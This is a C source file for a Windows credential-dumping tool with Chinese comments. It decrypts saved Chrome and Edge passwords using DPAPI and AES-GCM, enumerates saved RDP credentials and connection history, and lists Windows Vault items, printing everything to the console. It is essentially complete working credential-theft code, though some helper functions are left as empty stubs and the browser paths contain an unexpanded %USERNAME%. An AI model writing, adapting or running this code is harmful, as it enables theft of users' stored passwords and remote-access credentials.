// file: advanced_features.c
// compile: x64 Native Tools Command Prompt -> cl /O2 /MT /Fe:AdvTool.exe advanced_features.c sqlite3.c /link wlanapi.lib dbghelp.lib credui.lib crypt32.lib
// run: Administrator

#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <wlanapi.h>
#include <tlhelp32.h>
#include <dbghelp.h>
#include <stdio.h>
#include <wincred.h>
#include <shlwapi.h>
#include <dpapi.h>
#include <bcrypt.h>
#include "sqlite3.h"

#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib, "dbghelp.lib")
#pragma comment(lib, "credui.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")

#ifndef WLAN_PROFILE_GET_PLAINTEXT
#define WLAN_PROFILE_GET_PLAINTEXT 0x00000002
#endif

// --- 辅助函数 (管理员权限检查等，与之前相同，此处略)
BOOL IsElevated() { /* ... 与之前相同 ... */ }
BOOL EnableDebugPrivilege() { /* ... 与之前相同 ... */ }
DWORD GetProcessPid(const wchar_t* procName) { /* ... 与之前相同 ... */ }

// ---------------- 模块5: Chromium 浏览器密码解密 ----------------
// 解密 DPAPI Blob 数据
BYTE* DecryptDPAPIBlob(BYTE* pEncryptedData, DWORD dwDataSize, DWORD* pdwOutSize) {
    DATA_BLOB DataIn, DataOut;
    DataIn.pbData = pEncryptedData;
    DataIn.cbData = dwDataSize;
    if (!CryptUnprotectData(&DataIn, NULL, NULL, NULL, NULL, 0, &DataOut)) {
        return NULL;
    }
    *pdwOutSize = DataOut.cbData;
    return DataOut.pbData;
}

// AES-GCM 解密
BOOL AesGcmDecrypt(const BYTE* key, DWORD keyLen, const BYTE* iv, DWORD ivLen,
    const BYTE* ciphertext, DWORD ciphertextLen, BYTE* plaintext, DWORD* plaintextLen) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    BOOL bResult = FALSE;
    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0))) goto cleanup;
    if (!BCRYPT_SUCCESS(BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (BYTE*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0))) goto cleanup;
    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (BYTE*)key, keyLen, 0))) goto cleanup;

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = (BYTE*)iv;
    authInfo.cbNonce = ivLen;
    authInfo.pbTag = (BYTE*)ciphertext + ciphertextLen - 16;
    authInfo.cbTag = 16;

    if (BCRYPT_SUCCESS(BCryptDecrypt(hKey, (BYTE*)ciphertext, ciphertextLen - 16, &authInfo, NULL, 0, plaintext, ciphertextLen - 16, plaintextLen, 0))) {
        bResult = TRUE;
    }
cleanup:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return bResult;
}

void ExtractChromePasswords(const wchar_t* browserPath, const wchar_t* browserName) {
    wchar_t localStatePath[MAX_PATH];
    wcscpy_s(localStatePath, browserPath);
    wcscat_s(localStatePath, L"\\Local State");

    // 1. 读取 Local State 文件
    HANDLE hFile = CreateFileW(localStatePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    DWORD fileSize = GetFileSize(hFile, NULL);
    char* jsonData = (char*)malloc(fileSize + 1);
    DWORD bytesRead = 0;
    ReadFile(hFile, jsonData, fileSize, &bytesRead, NULL);
    jsonData[fileSize] = '\0';
    CloseHandle(hFile);

    // 2. 解析 JSON 获取 encrypted_key
    char* keyTag = strstr(jsonData, "\"encrypted_key\":\"");
    if (!keyTag) { free(jsonData); return; }
    keyTag += 18;
    char* keyEnd = strstr(keyTag, "\"");
    if (!keyEnd) { free(jsonData); return; }
    *keyEnd = '\0';

    // 3. Base64 解码
    DWORD base64Len = 0;
    CryptStringToBinaryA(keyTag, 0, CRYPT_STRING_BASE64, NULL, &base64Len, NULL, NULL);
    BYTE* base64Decoded = (BYTE*)malloc(base64Len);
    CryptStringToBinaryA(keyTag, 0, CRYPT_STRING_BASE64, base64Decoded, &base64Len, NULL, NULL);

    // 4. 去除 "DPAPI" 前缀 (5字节)
    BYTE* encryptedKey = base64Decoded + 5;
    DWORD encryptedKeyLen = base64Len - 5;

    // 5. DPAPI 解密主密钥
    DWORD masterKeyLen = 0;
    BYTE* masterKey = DecryptDPAPIBlob(encryptedKey, encryptedKeyLen, &masterKeyLen);
    free(base64Decoded);
    if (!masterKey) { free(jsonData); return; }

    // 6. 读取 Login Data 数据库
    wchar_t loginDataPath[MAX_PATH];
    wcscpy_s(loginDataPath, browserPath);
    wcscat_s(loginDataPath, L"\\Default\\Login Data");

    sqlite3* db;
    if (sqlite3_open16(loginDataPath, &db) == SQLITE_OK) {
        const char* sql = "SELECT origin_url, username_value, password_value FROM logins";
        sqlite3_stmt* stmt;
        if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
            printf("\n[+] ----- %S Saved Passwords -----\n", browserName);
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                const char* url = (const char*)sqlite3_column_text(stmt, 0);
                const char* username = (const char*)sqlite3_column_text(stmt, 1);
                const BYTE* encryptedPwd = (const BYTE*)sqlite3_column_blob(stmt, 2);
                int encryptedPwdLen = sqlite3_column_bytes(stmt, 2);

                if (encryptedPwdLen <= 15) continue;
                const BYTE* iv = encryptedPwd + 3;
                const BYTE* ciphertext = encryptedPwd + 15;
                DWORD ciphertextLen = encryptedPwdLen - 15;
                BYTE* decryptedPwd = (BYTE*)malloc(ciphertextLen);
                DWORD decryptedLen = 0;

                if (AesGcmDecrypt(masterKey, masterKeyLen, iv, 12, ciphertext, ciphertextLen, decryptedPwd, &decryptedLen)) {
                    decryptedPwd[decryptedLen] = '\0';
                    printf("  URL: %s\n", url);
                    printf("  Username: %s\n", username);
                    printf("  Password: %s\n\n", decryptedPwd);
                }
                free(decryptedPwd);
            }
            sqlite3_finalize(stmt);
        }
        sqlite3_close(db);
    }
    free(masterKey);
    free(jsonData);
}

// ---------------- 模块6: RDP 保存密码提取 ----------------
void DumpRDPCredentials() {
    printf("\n[+] ===== RDP Saved Credentials =====\n");
    // 方法1: 使用 CredEnumerate API
    PCREDENTIALW* pCreds = NULL;
    DWORD dwCount = 0;
    if (CredEnumerateW(NULL, 0, &dwCount, &pCreds)) {
        int found = 0;
        for (DWORD i = 0; i < dwCount; i++) {
            if (wcsstr(pCreds[i]->TargetName, L"TERMSRV/") != NULL) {
                printf("\n[*] RDP Target: %S\n", pCreds[i]->TargetName);
                printf("    Username: %S\n", pCreds[i]->UserName);
                if (pCreds[i]->CredentialBlobSize > 0) {
                    printf("    Password: %S\n", (wchar_t*)pCreds[i]->CredentialBlob);
                } else {
                    printf("    Password: (empty)\n");
                }
                found++;
            }
        }
        CredFree(pCreds);
        if (found == 0) printf("[-] No RDP credentials found via CredEnumerate.\n");
    } else {
        printf("[-] CredEnumerate failed with error: %lu\n", GetLastError());
    }

    // 方法2: 从注册表读取 RDP 连接历史
    printf("\n[*] RDP Connection History (from registry):\n");
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Terminal Server Client\\Servers", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD dwIndex = 0;
        wchar_t subkeyName[256];
        DWORD dwSize = 256;
        while (RegEnumKeyExW(hKey, dwIndex++, subkeyName, &dwSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
            printf("  %S\n", subkeyName);
            dwSize = 256;
        }
        RegCloseKey(hKey);
    }
}

// ---------------- 模块7: Windows Vault 凭据提取 ----------------
// Vault API 函数指针定义
typedef DWORD(WINAPI* pVaultEnumerateVaults)(DWORD, DWORD*, GUID**);
typedef DWORD(WINAPI* pVaultOpenVault)(GUID*, DWORD, HANDLE*);
typedef DWORD(WINAPI* pVaultCloseVault)(HANDLE);
typedef DWORD(WINAPI* pVaultEnumerateItems)(HANDLE, DWORD, DWORD*, PVOID*);
typedef DWORD(WINAPI* pVaultFree)(PVOID);
typedef DWORD(WINAPI* pVaultGetItem)(HANDLE, GUID*, PVOID, DWORD, DWORD, PVOID*);

void DumpWindowsVault() {
    printf("\n[+] ===== Windows Vault Credentials =====\n");
    HMODULE hVault = LoadLibraryW(L"vaultcli.dll");
    if (!hVault) {
        printf("[-] Failed to load vaultcli.dll\n");
        return;
    }

    pVaultEnumerateVaults VaultEnumerateVaults = (pVaultEnumerateVaults)GetProcAddress(hVault, "VaultEnumerateVaults");
    pVaultOpenVault VaultOpenVault = (pVaultOpenVault)GetProcAddress(hVault, "VaultOpenVault");
    pVaultCloseVault VaultCloseVault = (pVaultCloseVault)GetProcAddress(hVault, "VaultCloseVault");
    pVaultEnumerateItems VaultEnumerateItems = (pVaultEnumerateItems)GetProcAddress(hVault, "VaultEnumerateItems");
    pVaultFree VaultFree = (pVaultFree)GetProcAddress(hVault, "VaultFree");
    pVaultGetItem VaultGetItem = (pVaultGetItem)GetProcAddress(hVault, "VaultGetItem");

    if (!VaultEnumerateVaults || !VaultOpenVault || !VaultEnumerateItems) {
        printf("[-] Failed to get Vault API functions\n");
        FreeLibrary(hVault);
        return;
    }

    GUID* pVaults = NULL;
    DWORD dwVaults = 0;
    if (VaultEnumerateVaults(0, &dwVaults, &pVaults) == 0 && dwVaults > 0) {
        for (DWORD i = 0; i < dwVaults; i++) {
            HANDLE hOpenedVault = NULL;
            if (VaultOpenVault(&pVaults[i], 0, &hOpenedVault) == 0) {
                PVOID pItems = NULL;
                DWORD dwItems = 0;
                if (VaultEnumerateItems(hOpenedVault, 0, &dwItems, &pItems) == 0 && dwItems > 0) {
                    // 这里可以进一步解析每个凭据项，为简化示例，仅提示
                    printf("[*] Found %lu items in vault %d\n", dwItems, i);
                }
                if (pItems) VaultFree(pItems);
                VaultCloseVault(hOpenedVault);
            }
        }
        VaultFree(pVaults);
    }
    FreeLibrary(hVault);
}

// ---------------- 主函数 ----------------
int main() {
    SetConsoleOutputCP(CP_UTF8);
    printf("=========================================================\n");
    printf("     Windows 凭据提取工具 v5.0 (管理员运行)             \n");
    printf("=========================================================\n");
    if (!IsElevated()) {
        printf("\n[-] Please run as Administrator.\n");
        getchar();
        return 1;
    }

    // 调用新模块
    printf("\n[+] ===== Module: Chromium Password Extraction =====\n");
    ExtractChromePasswords(L"C:\\Users\\%USERNAME%\\AppData\\Local\\Google\\Chrome\\User Data", L"Chrome");
    ExtractChromePasswords(L"C:\\Users\\%USERNAME%\\AppData\\Local\\Microsoft\\Edge\\User Data", L"Edge");

    DumpRDPCredentials();
    DumpWindowsVault();

    printf("\n[*] Execution completed.\n");
    return 0;
}
